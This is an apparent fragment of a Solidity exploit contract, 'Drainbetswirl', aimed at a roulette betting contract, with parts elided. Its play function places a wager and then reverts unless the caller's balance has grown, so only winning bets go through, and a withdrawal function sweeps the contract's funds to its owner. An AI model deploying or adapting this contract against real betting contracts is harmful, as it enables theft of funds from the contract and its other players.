...
contract Drainbetswirl {
  address _contract;
  address _owner;

  constructor(address contractAddress, address owner) {
  ...
  function play() public payable {
    ...
    Roulette r = Roulette(_contract);
    r.wager(91447186090, 0x0000000000000000000000000000000000000000, msg.value, 0x0000000000000000000000000000000000000000);
    uint newbalance = msg.sender.balance;
    require(newbalance > balance, "no");
  }

  function unstuck_bnb() public {
    bool success;
    (success,) = address(_owner).call{value: address(this).balance}("");
  }
